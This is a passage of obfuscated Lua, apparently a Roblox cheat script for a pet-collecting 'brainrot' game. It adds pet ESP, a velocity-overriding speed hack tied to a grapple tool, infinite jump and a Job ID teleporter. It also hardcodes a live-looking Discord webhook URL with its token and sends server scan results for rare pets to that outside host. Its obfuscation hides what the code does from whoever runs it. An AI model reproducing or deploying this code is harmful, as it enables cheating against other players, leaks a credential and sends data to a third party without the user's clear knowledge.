FlatIdent_59521=0;while true do if (FlatIdent_59521==0) then addedConn:Disconnect();addedConn=nil;break;end end end for m,_ in pairs(petESPItems) do _cleanup_one(m);end break;end end end local petESPToggle=createToggle(contentTabs['Helper'],"ESP Pets (Brainrot)","Highlight pet + Money/s",4);petESPToggle.SetCallback(function(state) petESPEnabled=state;if state then _enable_pet_esp();else _disable_pet_esp();end end);end local playerTab=contentTabs['Player'];local fixfpsThread=nil;local fixfpsToggle=createToggle(playerTab,"fix fps akun","Giảm lag, tăng FPS",3);fixfpsToggle.SetCallback(function(state) if state then if fixfpsThread then task.cancel(fixfpsThread);end fixfpsThread=task.spawn(function() local FlatIdent_97B67=0;local ws;local nuke;local p;local l;local bp;local c;local h;local tool;local rs;while true do if (FlatIdent_97B67==1) then ws.DescendantAdded:Connect(function(inst) nuke(inst);end);getgenv().On=false;if (getgenv().On==false) then return;end p=game:GetService("Players");FlatIdent_97B67=2;end if (FlatIdent_97B67==3) then tool=bp:FindFirstChildOfClass("Tool");rs=game:GetService("RunService");while task.wait() do if (getgenv().On==false) then break;end h:EquipTool(tool);task.wait();end break;end if (0==FlatIdent_97B67) then ws=game:GetService("Workspace");nuke=nil;function nuke(obj) if (obj and obj:IsA("Accessory")) then pcall(function() obj:Destroy();end);end end for _,v in ipairs(ws:GetDescendants()) do nuke(v);end FlatIdent_97B67=1;end if (FlatIdent_97B67==2) then l=p.LocalPlayer;bp=l.Backpack;c=l.Character or workspace:WaitForChild(l.Name) ;h=c:FindFirstChildOfClass("Humanoid") or c:WaitForChild("Humanoid") ;FlatIdent_97B67=3;end end end);elseif fixfpsThread then local FlatIdent_95405=0;while true do if (FlatIdent_95405==0) then task.cancel(fixfpsThread);fixfpsThread=nil;break;end end end end);local _tp_hybrid_obj=nil;local function TP_BuildHybridGrapple(parentGui) do local Players=game:GetService("Players");local UIS=game:GetService("UserInputService");local CAS=game:GetService("ContextActionService");local RS=game:GetService("RunService");local LocalPlayer=Players.LocalPlayer;local FORCE_TOOL_NAME="Grapple Hook";local AUTO_EQUIP=true;local SPEED_MIN,SPEED_MAX,SPEED_STEP=40,320,5;local MAX_SPEED=150;local EFF_SPEED=150;local EFF_MIN=70;local RAMP_UP=35;local RAMP_DOWN=220;local BLEND=0.55;local ONLY_FLAT=true;local CAM_WEIGHT=0.9;local MOVE_WEIGHT=0.8;local HOOK_ACTIVATE_MIN,HOOK_ACTIVATE_MAX=0.28,0.75;local HOOK_ACTIVATE_UP,HOOK_ACTIVATE_DOWN=0.12,0.05;local SNAP_POS_THRESHOLD=3.2;local SNAP_VEL_THRESHOLD=45;local SNAP_COOLDOWN=0.3;local AIR_MULTIPLIER=0.6;local RAY_LENGTH=6;local GROUND_COOLDOWN=0.12;local enabled=false;local char,hum,hrp;local trackedTool,toolEquipped=nil,false;local lastPos,lastVel,lastSnapAt=nil,nil,0;local hookInterval,lastActivate=HOOK_ACTIVATE_MIN,0;local lastGroundCheck,isAir=0,false;local parentGui=((typeof(gui)=="Instance") and gui:IsA("ScreenGui") and gui) or (function() local FlatIdent_8BF78=0;local g;while true do if (FlatIdent_8BF78==2) then g.Parent=game:GetService("CoreGui");return g;end if (FlatIdent_8BF78==1) then g.ResetOnSpawn=false;g.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;FlatIdent_8BF78=2;end if (0==FlatIdent_8BF78) then g=Instance.new("ScreenGui");g.Name="TP_HybridGrappleGui";FlatIdent_8BF78=1;end end end)() ;local function showToast(msg,t) local toast=parentGui:FindFirstChild("TP_Toast") or (function() local FlatIdent_6C51A=0;local lb;while true do if (FlatIdent_6C51A==2) then lb.TextColor3=Color3.fromRGB(255,255,255);lb.Font=Enum.Font.GothamSemibold;lb.TextSize=14;FlatIdent_6C51A=3;end if (4==FlatIdent_6C51A) then return lb;end if (1==FlatIdent_6C51A) then lb.Position=UDim2.new(0.5, -160,0,36);lb.BackgroundColor3=Color3.fromRGB(25,50,100);lb.BackgroundTransparency=0.12;FlatIdent_6C51A=2;end if (FlatIdent_6C51A==3) then lb.Visible=false;lb.Parent=parentGui;Instance.new("UICorner",lb).CornerRadius=UDim.new(0,8);FlatIdent_6C51A=4;end if (FlatIdent_6C51A==0) then lb=Instance.new("TextLabel");lb.Name="TP_Toast";lb.Size=UDim2.new(0,320,0,32);FlatIdent_6C51A=1;end end end)() ;toast.Text=msg;toast.Visible=true;task.delay(t or 1.1 ,function() if toast then toast.Visible=false;end end);end local panelFrame,lblRope;local function refreshOnBtn() end local function refreshPanel() end do local FlatIdent_1784A=0;local fr;local mkLabel;local title;local onBtn;local spLabel;local spBox;local lblEff;local lblTool;local lblMode;local lblAir;while true do if (FlatIdent_1784A==6) then Instance.new("UICorner",spBox).CornerRadius=UDim.new(0,8);lblEff=mkLabel(100);lblTool=mkLabel(122);lblRope=mkLabel(144);lblMode=mkLabel(166);lblAir=mkLabel(188);FlatIdent_1784A=7;end if (FlatIdent_1784A==7) then function refreshOnBtn() if enabled then local FlatIdent_8DAB1=0;while true do if (FlatIdent_8DAB1==0) then onBtn.Text="ON";onBtn.BackgroundColor3=Color3.fromRGB(0,170,255);break;end end else local FlatIdent_24237=0;while true do if (FlatIdent_24237==0) then onBtn.Text="OFF";onBtn.BackgroundColor3=Color3.fromRGB(180,60,60);break;end end end end function refreshPanel() spBox.Text=tostring(MAX_SPEED);lblEff.Text=("EffSpeed: %d | HookInterval: %.2fs"):format(math.floor(EFF_SPEED + 0.5 ),hookInterval);lblTool.Text=("ToolFound: %s | Equipped: %s"):format((trackedTool and "Yes") or "No" ,(toolEquipped and "Yes") or "No" );lblMode.Text=("Mode: %s"):format((trackedTool and toolEquipped and "Hook/Pet-auto") or "Pet" );lblAir.Text=("isAir: %s"):format((isAir and "Yes") or "No" );end onBtn.MouseButton1Click:Connect(function() local FlatIdent_696E1=0;while true do if (FlatIdent_696E1==0) then enabled= not enabled;refreshOnBtn();FlatIdent_696E1=1;end if (FlatIdent_696E1==1) then refreshPanel();showToast(("Hybrid: %s  (Max %d / Eff %d)"):format((enabled and "ON") or "OFF" ,MAX_SPEED,EFF_SPEED),1.2);break;end end end);spBox.FocusLost:Connect(function() local n=tonumber((spBox.Text or ""):gsub("[^%d]",""));if n then local FlatIdent_904EC=0;while true do if (FlatIdent_904EC==1) then if (EFF_SPEED>MAX_SPEED) then EFF_SPEED=MAX_SPEED;end break;end if (0==FlatIdent_904EC) then n=math.clamp(math.floor((n/SPEED_STEP) + 0.5 ) * SPEED_STEP ,SPEED_MIN,SPEED_MAX);MAX_SPEED=n;FlatIdent_904EC=1;end end end refreshPanel();showToast(("Max set: %d"):format(MAX_SPEED),0.9);end);break;end if (2==FlatIdent_1784A) then title=mkLabel(6);title.Font=Enum.Font.GothamBold;title.TextSize=16;title.Text="Hybrid Grapple (Debug)";onBtn=Instance.new("TextButton",fr);onBtn.Size=UDim2.new(0,84,0,30);FlatIdent_1784A=3;end if (FlatIdent_1784A==0) then fr=Instance.new("Frame");fr.Name="TP_SpeedPanel";fr.Size=UDim2.new(0,320,0,210);fr.Position=UDim2.new(1, -330,0,80);fr.BackgroundColor3=Color3.fromRGB(25,50,100);fr.BackgroundTransparency=0.12;FlatIdent_1784A=1;end if (FlatIdent_1784A==4) then onBtn.Text="OFF";Instance.new("UICorner",onBtn).CornerRadius=UDim.new(0,8);spLabel=mkLabel(72);spLabel.Text="Max Speed:";spBox=Instance.new("TextBox",fr);spBox.Size=UDim2.new(0,68,0,28);FlatIdent_1784A=5;end if (FlatIdent_1784A==1) then fr.Visible=false;fr.Parent=parentGui;Instance.new("UICorner",fr).CornerRadius=UDim.new(0,10);panelFrame=fr;mkLabel=nil;function mkLabel(y) local l=Instance.new("TextLabel",fr);l.Size=UDim2.new(1, -20,0,20);l.Position=UDim2.new(0,10,0,y);l.BackgroundTransparency=1;l.Font=Enum.Font.Gotham;l.TextSize=14;l.TextXAlignment=Enum.TextXAlignment.Left;l.TextColor3=Color3.fromRGB(220,235,255);l.Text="";return l;end FlatIdent_1784A=2;end if (FlatIdent_1784A==5) then spBox.Position=UDim2.new(0,110,0,68);spBox.BackgroundColor3=Color3.fromRGB(30,60,120);spBox.Font=Enum.Font.GothamSemibold;spBox.TextSize=14;spBox.TextColor3=Color3.fromRGB(255,255,255);spBox.ClearTextOnFocus=false;FlatIdent_1784A=6;end if (FlatIdent_1784A==3) then onBtn.Position=UDim2.new(0,10,0,36);onBtn.AutoButtonColor=true;onBtn.Font=Enum.Font.GothamSemibold;onBtn.TextSize=14;onBtn.TextColor3=Color3.fromRGB(255,255,255);onBtn.BackgroundColor3=Color3.fromRGB(180,60,60);FlatIdent_1784A=4;end end end local function toggleAction(_,state) if (state~=Enum.UserInputState.Begin) then return Enum.ContextActionResult.Pass;end enabled= not enabled;refreshOnBtn();refreshPanel();showToast(("Hybrid: %s  (Max %d / Eff %d)"):format((enabled and "ON") or "OFF" ,MAX_SPEED,EFF_SPEED),1.2);return Enum.ContextActionResult.Sink;end CAS:BindActionAtPriority("TP_ToggleHybrid",toggleAction,true,3000,Enum.KeyCode.Q);UIS.InputEnded:Connect(function(input) if ((input.KeyCode==Enum.KeyCode.Q) and (UIS:IsKeyDown(Enum.KeyCode.LeftControl) or UIS:IsKeyDown(Enum.KeyCode.RightControl))) then local FlatIdent_6D8EC=0;while true do if (FlatIdent_6D8EC==0) then panelFrame.Visible= not panelFrame.Visible;refreshPanel();break;end end end end);local function onCharacter(c) local FlatIdent_25061=0;while true do if (FlatIdent_25061==1) then hrp=c:WaitForChild("HumanoidRootPart",6);trackedTool,toolEquipped=nil,false;FlatIdent_25061=2;end if (FlatIdent_25061==2) then lastPos,lastVel=nil,nil;c.ChildAdded:Connect(function(obj) if (obj:IsA("Tool") and (obj.Name==FORCE_TOOL_NAME)) then trackedTool,toolEquipped=obj,true;end end);FlatIdent_25061=3;end if (FlatIdent_25061==0) then char=c;hum=c:WaitForChild("Humanoid",6);FlatIdent_25061=1;end if (FlatIdent_25061==3) then c.ChildRemoved:Connect(function(obj) if (obj==trackedTool) then trackedTool,toolEquipped=nil,false;end end);break;end end end if LocalPlayer.Character then onCharacter(LocalPlayer.Character);end LocalPlayer.CharacterAdded:Connect(onCharacter);local function getToolInBackpack() local FlatIdent_63A3A=0;local bp;local t;while true do if (FlatIdent_63A3A==0) then bp=LocalPlayer:FindFirstChildOfClass("Backpack");if  not bp then return nil;end FlatIdent_63A3A=1;end if (FlatIdent_63A3A==1) then t=bp:FindFirstChild(FORCE_TOOL_NAME);if (t and t:IsA("Tool")) then return t;end FlatIdent_63A3A=2;end if (2==FlatIdent_63A3A) then return nil;end end end local function mixedDir() if  not hrp then return nil;end local v=Vector3.zero;local cam=workspace.CurrentCamera;if cam then v+=(cam.CFrame.LookVector * CAM_WEIGHT) end if (hum and (hum.MoveDirection.Magnitude>0.0010000000474974513)) then v+=(hum.MoveDirection * MOVE_WEIGHT) end if (v.Magnitude<0.0010000000474974513) then return nil;end v=v.Unit;if ONLY_FLAT then v=Vector3.new(v.X,0,v.Z);end if (v.Magnitude<0.0010000000474974513) then return nil;end return v.Unit;end local indexedRopes={};local function _isInChar(inst) return inst and char and inst:IsDescendantOf(char) ;end local function refreshRopeIndex() local FlatIdent_354BC=0;local t;while true do if (FlatIdent_354BC==1) then for _,d in ipairs(workspace:GetDescendants()) do if d:IsA("RopeConstraint") then local FlatIdent_28E8A=0;local a0;local a1;while true do if (FlatIdent_28E8A==0) then a0,a1=d.Attachment0,d.Attachment1;if (a0 and a1 and (_isInChar(a0) or _isInChar(a1))) then table.insert(t,d);end break;end end elseif d:IsA("Beam") then local a0,a1=d.Attachment0,d.Attachment1;if (a0 and a1 and (_isInChar(a0) or _isInChar(a1))) then table.insert(t,d);end end end indexedRopes=t;break;end if (0==FlatIdent_354BC) then if  not char then local FlatIdent_44652=0;while true do if (FlatIdent_44652==0) then indexedRopes={};return;end end end t={};FlatIdent_354BC=1;end end end task.spawn(function() while true do local FlatIdent_8751C=0;while true do if (FlatIdent_8751C==0) then if enabled then pcall(refreshRopeIndex);end task.wait(0.25);break;end end end end);local function findRopeAndDir() local FlatIdent_1DE58=0;local dirFromPair;local ropeFrom;while true do if (FlatIdent_1DE58==0) then if  not hrp then return nil,false;end dirFromPair=nil;FlatIdent_1DE58=1;end if (FlatIdent_1DE58==2) then function ropeFrom(inst) local FlatIdent_2EB74=0;local rope;local beam;while true do if (FlatIdent_2EB74==0) then rope=inst:FindFirstChildOfClass("RopeConstraint",true);if (rope and rope.Attachment0 and rope.Attachment1) then return rope.Attachment0.WorldPosition,rope.Attachment1.WorldPosition,true;end FlatIdent_2EB74=1;end if (FlatIdent_2EB74==2) then return nil,nil,false;end if (FlatIdent_2EB74==1) then beam=inst:FindFirstChildOfClass("Beam",true);if (beam and beam.Attachment0 and beam.Attachment1) then return beam.Attachment0.WorldPosition,beam.Attachment1.WorldPosition,true;end FlatIdent_2EB74=2;end end end if trackedTool then local FlatIdent_91AD1=0;local a;local b;local ok;while true do if (FlatIdent_91AD1==0) then a,b,ok=ropeFrom(trackedTool);if ok then local FlatIdent_37DBD=0;local d;while true do if (FlatIdent_37DBD==0) then d=dirFromPair(a,b);if d then return d,true;end break;end end end break;end end end FlatIdent_1DE58=3;end if (FlatIdent_1DE58==4) then return nil,false;end if (FlatIdent_1DE58==1) then function dirFromPair(a,b) local FlatIdent_61BF4=0;local from;local to;local v;while true do if (FlatIdent_61BF4==0) then if ( not a or  not b) then return nil;end from=hrp.Position;FlatIdent_61BF4=1;end if (FlatIdent_61BF4==2) then if (v.Magnitude<0.0010000000474974513) then return nil;end v=Vector3.new(v.X,0,v.Z);FlatIdent_61BF4=3;end if (FlatIdent_61BF4==3) then if (v.Magnitude<0.0010000000474974513) then return nil;end return v.Unit;end if (1==FlatIdent_61BF4) then to=(_isInChar(a) and b) or (_isInChar(b) and a) or (((from-a).Magnitude<(from-b).Magnitude) and b) or a ;v=to-from ;FlatIdent_61BF4=2;end end end ropeFrom=nil;FlatIdent_1DE58=2;end if (FlatIdent_1DE58==3) then if char then local FlatIdent_624DF=0;local a;local b;local ok;while true do if (FlatIdent_624DF==0) then a,b,ok=ropeFrom(char);if ok then local d=dirFromPair(a,b);if d then return d,true;end end break;end end end for _,rc in ipairs(indexedRopes) do local a,b;if rc:IsA("RopeConstraint") then if (rc.Attachment0 and rc.Attachment1) then a=rc.Attachment0.WorldPosition;b=rc.Attachment1.WorldPosition;end elseif (rc.Attachment0 and rc.Attachment1) then local FlatIdent_15E91=0;while true do if (FlatIdent_15E91==0) then a=rc.Attachment0.WorldPosition;b=rc.Attachment1.WorldPosition;break;end end end local d=dirFromPair(a,b);if d then return d,true;end end FlatIdent_1DE58=4;end end end local function detectSnap(dt) if ( not lastPos or  not lastVel or  not hrp) then return false;end local predicted=lastPos + (lastVel * (dt or 0.0167)) ;local posErr=(hrp.Position-predicted).Magnitude;local velNow=hrp.AssemblyLinearVelocity;local velErr=(velNow-lastVel).Magnitude;return (posErr>SNAP_POS_THRESHOLD) and (velErr>SNAP_VEL_THRESHOLD) ;end local function checkGround() local FlatIdent_87F0A=0;local now;local params;local res;while true do if (FlatIdent_87F0A==1) then if ((now-lastGroundCheck)<GROUND_COOLDOWN) then return;end lastGroundCheck=now;FlatIdent_87F0A=2;end if (FlatIdent_87F0A==4) then isAir=res==nil ;break;end if (FlatIdent_87F0A==0) then if  not hrp then return;end now=tick();FlatIdent_87F0A=1;end if (FlatIdent_87F0A==3) then params.FilterType=Enum.RaycastFilterType.Blacklist;res=workspace:Raycast(hrp.Position,Vector3.new(0, -RAY_LENGTH,0),params);FlatIdent_87F0A=4;end if (FlatIdent_87F0A==2) then params=RaycastParams.new();params.FilterDescendantsInstances={char};FlatIdent_87F0A=3;end end end RS.Heartbeat:Connect(function(dt) local FlatIdent_84C31=0;local dir;local ropeOK;while true do if (FlatIdent_84C31==0) then if ( not enabled or  not hrp) then return;end if ( not trackedTool or (trackedTool.Parent~=char)) then local FlatIdent_5E642=0;local t;while true do if (FlatIdent_5E642==0) then t=getToolInBackpack();if (t and AUTO_EQUIP and hum) then pcall(function() hum:EquipTool(t);end);end break;end end end checkGround();FlatIdent_84C31=1;end if (FlatIdent_84C31==1) then if (dt and detectSnap(dt) and ((tick() -lastSnapAt)>SNAP_COOLDOWN)) then local FlatIdent_532EC=0;while true do if (FlatIdent_532EC==1) then hookInterval=math.min(HOOK_ACTIVATE_MAX,hookInterval + HOOK_ACTIVATE_UP );break;end if (0==FlatIdent_532EC) then lastSnapAt=tick();EFF_SPEED=math.max(EFF_MIN,math.min(EFF_SPEED-(RAMP_DOWN * dt * 0.6) ,MAX_SPEED));FlatIdent_532EC=1;end end else local FlatIdent_1351F=0;local upGain;while true do if (1==FlatIdent_1351F) then hookInterval=math.max(HOOK_ACTIVATE_MIN,hookInterval-HOOK_ACTIVATE_DOWN );break;end if (0==FlatIdent_1351F) then upGain=(isAir and (RAMP_UP * 0.5)) or RAMP_UP ;if (EFF_SPEED<MAX_SPEED) then EFF_SPEED=math.min(MAX_SPEED,EFF_SPEED + (upGain * (dt or 0.0167)) );elseif (EFF_SPEED>MAX_SPEED) then EFF_SPEED=math.max(MAX_SPEED,EFF_SPEED-(RAMP_DOWN * 0.5 * (dt or 0.0167)) );end FlatIdent_1351F=1;end end end dir,ropeOK=findRopeAndDir();if (panelFrame.Visible and lblRope) then lblRope.Text=("RopeFound: %s"):format((ropeOK and "Yes") or "No" );end FlatIdent_84C31=2;end if (FlatIdent_84C31==3) then lastVel=hrp.AssemblyLinearVelocity;lastPos=hrp.Position;if panelFrame.Visible then refreshPanel();end break;end if (FlatIdent_84C31==2) then if  not dir then dir=mixedDir();end if dir then local cur=hrp.AssemblyLinearVelocity;local eff=(isAir and (EFF_SPEED * AIR_MULTIPLIER)) or EFF_SPEED ;local target=dir * eff ;local newX=(cur.X * (1 -BLEND)) + (target.X * BLEND) ;local newZ=(cur.Z * (1 -BLEND)) + (target.Z * BLEND) ;hrp.AssemblyLinearVelocity=Vector3.new(newX,cur.Y,newZ);end if (trackedTool and (trackedTool.Parent==char) and trackedTool.Activate) then local now=tick();if ((now-lastActivate)>=hookInterval) then local FlatIdent_32079=0;while true do if (0==FlatIdent_32079) then lastActivate=now;pcall(function() trackedTool:Activate();end);break;end end end end FlatIdent_84C31=3;end end end);refreshOnBtn();refreshPanel();end end local speedToggle=createToggle(playerTab,"speed boost rebirth 4","Q để bật/tắt, Ctrl+Q mở panel",2);speedToggle.SetCallback(function(state) if ( not _tp_hybrid_obj and state) then _tp_hybrid_obj=TP_BuildHybridGrapple(gui);end if _tp_hybrid_obj then if _tp_hybrid_obj.setEnabled then _tp_hybrid_obj.setEnabled(state);end end end);local infJumpEnabled=false;local HRP;RunService.RenderStepped:Connect(function() if (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")) then HRP=LocalPlayer.Character.HumanoidRootPart;end end);UserInputService.InputBegan:Connect(function(input,processed) if (infJumpEnabled and (input.KeyCode==Enum.KeyCode.Space) and HRP) then HRP.Velocity=Vector3.new(HRP.Velocity.X,50,HRP.Velocity.Z);end end);local infJumpToggle=createToggle(playerTab,"Infinite Jump","Nhảy không giới hạn",1);infJumpToggle.SetCallback(function(state) infJumpEnabled=state;end);local TeleportService=game:GetService("TeleportService");local DEST_PLACE_ID=109983668079237;local _b64Alphabet="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";local function _tp_b64_decode(data) local FlatIdent_24300=0;local t;local bitBuffer;while true do if (0==FlatIdent_24300) then data=tostring(data or "" ):gsub("[^%w%+/%=]","");t,bitBuffer={},"";FlatIdent_24300=1;end if (FlatIdent_24300==1) then for i=1, #data do local ch=data:sub(i,i);if (ch~="=") then local FlatIdent_80263=0;local idx;while true do if (FlatIdent_80263==0) then idx=_b64Alphabet:find(ch,1,true);if idx then local FlatIdent_88CAD=0;local bits;while true do if (FlatIdent_88CAD==0) then idx=idx-1 ;bits="";FlatIdent_88CAD=1;end if (FlatIdent_88CAD==1) then for b=6,1, -1 do bits=bits   .. (((((idx%(2^b)) -(idx%(2^(b-1))))>0) and "1") or "0") ;end bitBuffer=bitBuffer   .. bits ;break;end end end break;end end end end for j=1, #bitBuffer,8 do local FlatIdent_72401=0;local byte;while true do if (FlatIdent_72401==0) then byte=bitBuffer:sub(j,j + 7 );if ( #byte==8) then local c=0;for k=1,8 do if (byte:sub(k,k)=="1") then c=c + (2^(8 -k)) ;end end t[ #t + 1 ]=string.char(c);end break;end end end FlatIdent_24300=2;end if (2==FlatIdent_24300) then return table.concat(t);end end end local function _tp_sanitizeJobIdInput(s) s=tostring(s or "" ):gsub("`","");s=s:gsub("\r",""):gsub("\n",""):gsub("^%s+",""):gsub("%s+$","");return s;end local function _tp_guessJobId(str) local FlatIdent_53D9=0;local ok;local decoded;while true do if (FlatIdent_53D9==0) then str=_tp_sanitizeJobIdInput(str);if (str:find("%-") and ( #str>=30)) then return str;end FlatIdent_53D9=1;end if (FlatIdent_53D9==1) then ok,decoded=pcall(_tp_b64_decode,str);if (ok and decoded and ( #decoded>=30) and decoded:find("%-")) then return decoded;end FlatIdent_53D9=2;end if (FlatIdent_53D9==2) then return str;end end end do local FlatIdent_674F6=0;local serverTab;local title;local box;local joinBtn;local statusLbl;local busy;local setStatus;while true do if (9==FlatIdent_674F6) then statusLbl.Parent=serverTab;statusLbl.Size=UDim2.new(1, -20,0,22);statusLbl.Position=UDim2.new(0,10,0,134);statusLbl.BackgroundTransparency=1;FlatIdent_674F6=10;end if (FlatIdent_674F6==2) then title.TextColor3=Color3.fromRGB(230,230,230);title.TextXAlignment=Enum.TextXAlignment.Left;title.Text="Join Job ID";box=Instance.new("TextBox");FlatIdent_674F6=3;end if (FlatIdent_674F6==5) then box.TextColor3=Color3.fromRGB(255,255,255);box.BackgroundColor3=Color3.fromRGB(30,60,120);box.BackgroundTransparency=0.2;Instance.new("UICorner",box).CornerRadius=UDim.new(0,8);FlatIdent_674F6=6;end if (FlatIdent_674F6==12) then joinBtn.MouseButton1Click:Connect(function() local FlatIdent_38DAC=0;local raw;local jobId;while true do if (0==FlatIdent_38DAC) then if busy then return;end raw=box.Text or "" ;FlatIdent_38DAC=1;end if (FlatIdent_38DAC==2) then if ( not jobId or ( #jobId<30)) then setStatus("❌ Invalid Job ID.");return;end busy=true;FlatIdent_38DAC=3;end if (FlatIdent_38DAC==3) then setStatus("⏳ Joining "   .. jobId   .. " ..." );task.spawn(function() if getgenv().TP_ALLOW_JOIN then getgenv().TP_ALLOW_JOIN(3);end local ok,err=pcall(function() TeleportService:TeleportToPlaceInstance(DEST_PLACE_ID,jobId,LocalPlayer);end);if  not ok then setStatus("❌ Join error: "   .. tostring(err) );else setStatus("✅ Teleport requested. If you didn't move, try again.");end task.wait(1.5);busy=false;end);break;end if (FlatIdent_38DAC==1) then if (raw=="") then local FlatIdent_93540=0;while true do if (FlatIdent_93540==0) then setStatus("⚠️ Please paste a Job ID first.");return;end end end jobId=_tp_guessJobId(raw);FlatIdent_38DAC=2;end end end);break;end if (8==FlatIdent_674F6) then joinBtn.BackgroundColor3=Color3.fromRGB(0,170,255);joinBtn.AutoButtonColor=true;Instance.new("UICorner",joinBtn).CornerRadius=UDim.new(0,8);statusLbl=Instance.new("TextLabel");FlatIdent_674F6=9;end if (FlatIdent_674F6==6) then joinBtn=Instance.new("TextButton");joinBtn.Parent=serverTab;joinBtn.Size=UDim2.new(0,140,0,36);joinBtn.Position=UDim2.new(0,10,0,92);FlatIdent_674F6=7;end if (FlatIdent_674F6==1) then title.Position=UDim2.new(0,10,0,10);title.BackgroundTransparency=1;title.Font=Enum.Font.GothamBold;title.TextSize=16;FlatIdent_674F6=2;end if (FlatIdent_674F6==3) then box.Parent=serverTab;box.Size=UDim2.new(1, -20,0,36);box.Position=UDim2.new(0,10,0,48);box.PlaceholderText="";FlatIdent_674F6=4;end if (FlatIdent_674F6==10) then statusLbl.Font=Enum.Font.Gotham;statusLbl.TextSize=13;statusLbl.TextColor3=Color3.fromRGB(200,230,255);statusLbl.TextXAlignment=Enum.TextXAlignment.Left;FlatIdent_674F6=11;end if (FlatIdent_674F6==11) then statusLbl.Text="";busy=false;setStatus=nil;function setStatus(t) statusLbl.Text=t or "" ;end FlatIdent_674F6=12;end if (FlatIdent_674F6==0) then serverTab=contentTabs['Server'];title=Instance.new("TextLabel");title.Parent=serverTab;title.Size=UDim2.new(1, -20,0,28);FlatIdent_674F6=1;end if (FlatIdent_674F6==4) then box.Text="";box.ClearTextOnFocus=false;box.Font=Enum.Font.Gotham;box.TextSize=14;FlatIdent_674F6=5;end if (FlatIdent_674F6==7) then joinBtn.Text="Join server";joinBtn.Font=Enum.Font.GothamSemibold;joinBtn.TextSize=14;joinBtn.TextColor3=Color3.fromRGB(255,255,255);FlatIdent_674F6=8;end end end local TP_DEBUG=false;local TP_ONE_SHOT=false;local TP_FIRST_DELAY=5;local TP_SCAN_INTERVAL=60;local TP_WEBHOOK_URL="https://discordapp.com/api/webhooks/1410314122670903491/KD8clDHrbOMKlArHAoEyMXTqQGD6AAN7ftlYvdkFEOj5a9_VEGA9yqAhoH2XPK77TITb";local TP_RULES={{k="graipuss medussi",min=0,max=0},{k="la grande combinasion",min=0,max=0},{k="los combinasionas",min=0,max=0},{k="nuclearo dinossauro",min=0,max=0},{k="los hotspotsitos",min=0,max=0},{k="garama and madundung",min=0,max=0}};local TP_MAX_CARDS_PER_SERVER=5;local TP_reported_once=false;local TP_sent_global={};local function TP_http_post(url,tbl) local HttpService=game:GetService("HttpService");local body=HttpService:JSONEncode(tbl);local headers={["Content-Type"]="application/json"};local req=(syn and syn.request) or http_request or request or (http and http.request) ;if  not req then return false;end local ok,res=pcall(function() return req({Url=url,Method="POST",Headers=headers,Body=body});end);if (ok and res and ((res.StatusCode==204) or (res.StatusCode==200))) then return true;end if (ok and res and (res.StatusCode==429)) then local FlatIdent_37906=0;local h;local retry;while true do if (FlatIdent_37906==1) then task.wait(math.clamp(retry,1,10));res=req({Url=url,Method="POST",Headers=headers,Body=body});FlatIdent_37906=2;end if (FlatIdent_37906==2) then if (res and ((res.StatusCode==204) or (res.StatusCode==200))) then return true;end break;end if (FlatIdent_37906==0) then h=res.Headers or res.headers or {} ;retry=tonumber(h["Retry-After"] or h["retry-after"] or 2 ) or 2 ;FlatIdent_37906=1;end end end return false;end local function TP_fmt(n) local FlatIdent_9018E=0;local abs;local unit;local val;while true do if (FlatIdent_9018E==1) then if (abs>=1000000000) then val,unit=n/1000000000 ,"B/s";elseif (abs>=1000000) then val,unit=n/1000000 ,"M/s";elseif (abs>=1000) then val,unit=n/1000 ,"K/s";end return ("$%s%s"):format(tostring(("%.2f"):format(val):gsub("%.?0+$","")),unit);end if (FlatIdent_9018E==0) then n=tonumber(n) or 0 ;abs,unit,val=math.abs(n),"/s",n;FlatIdent_9018E=1;end end end local function TP_b64(s) local FlatIdent_13AEB=0;local b;while true do if (FlatIdent_13AEB==0) then b="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";return (s:gsub(".",function(x) local FlatIdent_1D2CD=0;local r;local bits;while true do if (FlatIdent_1D2CD==0) then r,bits="",x:byte();for i=8,1, -1 do r=r   .. (((((bits%(2^i)) -(bits%(2^(i-1))))>0) and "1") or "0") ;end FlatIdent_1D2CD=1;end if (1==FlatIdent_1D2CD) then return r;end end end)   .. "0000"):gsub("%d%d%d?%d?%d?%d?",function(x) local FlatIdent_78655=0;local c;while true do if (FlatIdent_78655==1) then for i=1,6 do c=c + (((x:sub(i,i)=="1") and (2^(6 -i))) or 0) ;end return b:sub(c + 1 ,c + 1 );end if (FlatIdent_78655==0) then if ( #x<6) then return "";end c=0;FlatIdent_78655=1;end end end)   .. ({"","==","="})[( #s%3) + 1 ] ;end end end local function TP_parse_mps(val) local FlatIdent_360C0=0;local s;local num;while true do if (FlatIdent_360C0==0) then if (typeof(val)=="number") then return val;end if (typeof(val)~="string") then return 0;end FlatIdent_360C0=1;end if (FlatIdent_360C0==2) then if s:find("b") then num=num * 1000000000 ;elseif s:find("m") then num=num * 1000000 ;elseif s:find("k") then num=num * 1000 ;end return math.floor(num + 0.5 );end if (1==FlatIdent_360C0) then s=val:lower();num=tonumber((s:match("([%d%.]+)")) or "0" ) or 0 ;FlatIdent_360C0=2;end end end local TP_ALLOW={"mps","moneypersec","money_per_sec","moneypersecond","persec","per_second"};local TP_DENY={"offline","cash","total","bank","balance","wallet","coins","gems","price","cost","buy","sell","collect","collected"};local function TP_has_token(s,toks) s=tostring(s or "" ):lower();for _,t in ipairs(toks) do if s:find(t,1,true) then return true;end end return false;end local function TP_text_is_per_sec(txt) local s=tostring(txt or "" ):lower();return (s:find("/s",1,true)~=nil) or s:find("per%s*sec") or s:find("per%s*second") ;end local function TP_collect_prices(container) local list={};if  not (container and container.GetDescendants) then return list;end local ok,descs=pcall(container.GetDescendants,container);if ( not ok or (type(descs)~="table")) then return list;end for i=1, #descs do local d=descs[i];local nm_l=tostring(d.Name or "" ):lower();if  not TP_has_token(nm_l,TP_DENY) then if (d:IsA("TextLabel") or d:IsA("TextButton")) then local FlatIdent_B716=0;local t;while true do if (FlatIdent_B716==0) then t=tostring(d.Text or "" );if ((t~="") and TP_text_is_per_sec(t) and  not TP_has_token(t,TP_DENY)) then local FlatIdent_3A079=0;local n;while true do if (FlatIdent_3A079==0) then n=TP_parse_mps(t);if (n>0) then list[ #list + 1 ]=n;end break;end end end break;end end elseif d:IsA("StringValue") then local FlatIdent_8E526=0;local v;while true do if (FlatIdent_8E526==0) then v=d.Value;if ((type(v)=="string") and TP_text_is_per_sec(v) and  not 